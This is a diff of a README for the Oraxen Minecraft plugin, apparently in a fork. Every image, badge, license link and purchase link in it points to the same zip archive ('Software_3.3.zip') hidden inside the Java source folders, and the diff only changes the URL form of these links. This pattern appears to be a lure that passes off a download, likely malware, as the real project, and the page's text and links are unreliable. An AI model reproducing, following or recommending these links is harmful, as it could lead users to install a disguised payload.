@@ -1,29 +1,29 @@
 <h1 align="center">
   <br>
-  <img src="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip logo" width="256">
+  <img src="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip logo" width="256">
   <br>
 </h1>
 
 <h4 align="center">☄️ Source code of the Oraxen spigot plugin, made with love in Java.</h4>
 
 <p align="center">
-    <a href="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="CodeFactor Score">
-        <img src="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
+    <a href="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="CodeFactor Score">
+        <img src="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
     </a>
-    <a href="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip">
-        <img alt="spigot" src="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
+    <a href="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip">
+        <img alt="spigot" src="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
     </a>
-    <a href="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="bstats servers">
-        <img src="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
+    <a href="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="bstats servers">
+        <img src="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
     </a>
-    <a href="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="bstats players">
-        <img src="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
+    <a href="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="bstats players">
+        <img src="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
     </a>
-    <a href="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="discord">
-        <img src="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
+    <a href="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="discord">
+        <img src="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
     </a>
-    <a href="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="Docs (gitbook)">
-        <img src="https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
+    <a href="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip" alt="Docs (gitbook)">
+        <img src="https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip"/>
     </a>
 </p>
 
@@ -48,9 +48,9 @@ increase oraxen features.
 
 ## License
 
-*Click here to read [the entire license](https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip).*
+*Click here to read [the entire license](https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip).*
 
-Oraxen is a paid plugin, to use it you must purchase a license on [https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip](https://raw.githubusercontent.com/zayoi23/oraxen/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip), nevertheless I
+Oraxen is a paid plugin, to use it you must purchase a license on [https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip](https://github.com/zayoi23/oraxen/raw/refs/heads/master/src/main/java/io/th0rgal/oraxen/mechanics/provided/gameplay/noteblock/directional/Software_3.3.zip), nevertheless I
 will not try to prevent you from downloading the source code and rebuilding it, as long as you do not distribute it (
 whether it is modified or intact and compiled or whether it is the source code, partial or complete). Public forks are
 allowed as long as you comply with the license (in order to propose a pull request). Buying a license will not only save
